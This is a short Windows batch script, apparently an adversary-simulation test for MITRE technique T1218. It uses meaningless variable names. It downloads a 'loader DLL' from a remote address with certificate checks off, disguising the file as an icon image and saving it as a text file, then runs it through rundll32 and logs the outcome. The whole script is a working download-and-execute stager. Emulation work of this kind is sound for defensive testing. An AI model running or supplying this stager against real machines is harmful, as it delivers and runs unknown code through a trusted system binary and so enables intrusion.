@echo off
SET xjkqwo=%APPDATA%\10231\b61fc74a
SET plmvrt=145a092d.txt
SET zaqwsx=https://10.0.0.49/stage/2/icon.png?10231-7
SET mnbvcx=BALAM-S2B
SET lkjhgf=10231
SET qwerty=https://10.0.0.49/stage/10231-7/3
SET asdfgh=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/517.36 (HTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
SET zxcvbn=7

REM Heartbeat loader fetch (writes Loader DLL to disk)
curl -k -s -o "%xjkqwo%\%plmvrt%" "%zaqwsx%"

REM Check if file was written and invoke via LOLBIN
IF EXIST "%xjkqwo%\%plmvrt%" (
    cd /d "%xjkqwo%"
    rundll32.exe %plmvrt%, DllMain
    IF %ERRORLEVEL% EQU 0 (
        echo [%date% %time%][TTP][%mnbvcx%][%lkjhgf%]: T1218^|System Binary Proxy Execution=[OK]:[] >> "%APPDATA%\%zxcvbn%\macula-simulations.log" 2>nul
    ) ELSE (
        echo [%date% %time%][TTP][%mnbvcx%][%lkjhgf%]: T1218^|System Binary Proxy Execution=[FAIL]:[rundll32_failed] >> "%APPDATA%\%zxcvbn%\macula-simulations.log" 2>nul
    )
) ELSE (
    echo [%date% %time%][TTP][%mnbvcx%][%lkjhgf%]: T1218^|System Binary Proxy Execution=[FAIL]:[loader_not_found] >> "%APPDATA%\%zxcvbn%\macula-simulations.log" 2>nul
)